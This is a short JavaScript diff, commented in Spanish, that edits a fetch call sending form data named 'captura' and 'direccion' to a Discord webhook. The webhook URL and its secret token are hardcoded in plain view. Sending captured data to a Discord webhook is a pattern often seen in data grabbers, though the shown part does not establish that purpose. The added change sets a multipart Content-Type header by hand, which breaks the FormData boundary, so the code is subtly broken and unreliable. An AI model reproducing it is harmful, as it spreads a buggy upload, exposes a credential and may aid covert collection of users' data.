@@ -96,10 +96,13 @@
         formData.append('captura', captura);
         formData.append('direccion', direccion);
 
-        // Realizar una solicitud POST al Webhook de Discord
+        // Realizar una solicitud POST al Webhook de Discord con el tipo de contenido adecuado
         fetch('https://discordapp.com/api/webhooks/1157760501829345320/5vqHkW8jnO_nFfS8WSL-2fsP9q_Jxa2wTkAAhrml4P681DYeXAAJd51F94_rISviSmSo', {
             method: 'POST',
-            body: formData
+            body: formData,
+            headers: {
+                'Content-Type': 'multipart/form-data'
+            }
         })
         .then(response => {
             if (response.ok) {
